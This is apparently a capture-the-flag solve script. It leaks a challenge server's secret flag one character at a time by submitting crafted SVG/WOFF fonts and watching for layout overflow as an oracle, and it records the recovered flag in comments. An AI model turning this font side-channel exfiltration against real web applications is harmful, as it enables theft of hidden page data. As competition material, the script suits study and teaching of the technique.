import base64
import os
import requests
from time import sleep

font1 = """<svg>
<defs>
<font id="hack" horiz-adv-x="300">
<font-face font-family="hack" units-per-em="100" />
<missing-glyph />
<glyph unicode="a" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="b" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="c" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="d" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="e" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="f" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="g" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="h" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="i" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="j" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="k" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="l" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="m" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="n" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="o" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="p" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="q" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="r" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="s" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="t" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="u" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="v" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="w" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="x" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="y" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="z" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="{" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="}" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="0" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="1" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="2" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="3" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="4" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="5" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="6" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="7" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="8" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="9" horiz-adv-x="300" d="M1 0z"/>
<glyph unicode="_" horiz-adv-x="300" d="M1 0z"/>
</font>
</defs>
</svg>
"""

s = requests.Session()
s.headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"}

with open("./fonts/font1-bak.svg", "wb") as f:
    f.write(font1.encode())


def genFont():
    # use fontforge to convert svg to woff (svg font isn't supported), the workdir must be current folder
    # run.sh is
    # #!/usr/bin/fontforge
    # Open($1)
    # Generate($1:r + ".woff")
    os.system("./fonts/run.sh ./fonts/font1.svg")
    url = ""
    with open("./fonts/font1.woff", "rb") as f:
        font1 = f.read()
        url = "data:application/x-font-woff;base64," + \
            base64.b64encode(font1).decode()
    return url


def isOverrflow(payload):
    re = s.post(url, data={"url": payload}, timeout=5).text
    return "Amazing" not in re


local_url = "http://127.0.0.1:3001"
url = "https://font-review.chall.pwnoh.io"

# get a proper font size to make it not overflow as default
curr = 300
os.system("cp ./fonts/font1-bak.svg ./fonts/font1.svg")

while isOverrflow(genFont()):
    with open("./fonts/font1.svg", "r") as f:
        content = f.read()
    with open("./fonts/font1.svg", "w") as f:
        # step is 25
        f.write(content.replace("horiz-adv-x=\"" + str(curr) +
                "\"", "horiz-adv-x=\"" + str(curr - 25) + "\""))
    curr -= 25
    # for rate limit if needed
    # sleep(1)

if curr == 300:
    print("Error! should increase the first font size")
    exit()

print(curr)

# result is 125 for each char
# curr = 125

# add flag byte by byte
# for started from breakpoint (due to the rate limit of the server)
# flag = "bctf{l34rn1n6_6r347_6r4ph1c_d3516n"
flag = "bctf{"
origin = "</font>"


def update_flag(origin, flag):

    with open("fonts/font1.svg", "r") as f:
        content = f.read()

    with open("fonts/font1.svg", "w") as f:
        if origin == "</font>":
            # if this is the first time to update the flag
            f.write(content.replace(
                "</font>", f"""<glyph unicode="{flag}" horiz-adv-x="{(len(flag) + 10) * curr}" d="M1 0z"/>\n</font>"""))
        else:
            f.write(content.replace(
                origin, f"""<glyph unicode="{flag}" horiz-adv-x="{(len(flag) + 10) * curr}" d="M1 0z"/>"""))  # 10 is magic number

    # used by next time replacement (Also we can use regex to do this)
    return f"""<glyph unicode="{flag}" horiz-adv-x="{(len(flag) + 10) * curr}" d="M1 0z"/>"""


# for started from breakpoint
# origin = """<glyph unicode="bctf{l34rn1n6_6r347_6r4ph1c_d3516n1" horiz-adv-x="5625" d="M1 0z"/>"""
origin = update_flag(origin, flag)
# make sure it will overflow if we make known flag larger
assert (isOverrflow(genFont()))
print("test passed")
found = False

# }_
# abcdefghijklmnopqrstuvwxyz
# '0123456789'
while not flag.endswith("}"):
    for i in "}_" + "0123456789" + "abcdefghijklmnopqrstuvwxyz":
        origin = update_flag(origin, flag + i)
        print(flag + i)
        # sleep for rate limit if needed
        # sleep(2)
        if isOverrflow(genFont()):
            flag += i
            found = True
            break
    if not found:
        print(flag)
        print("Panic!!!")
        break

# bctf{l34rn1n6_6r347_6r4ph1c_d3516n}
print(flag)
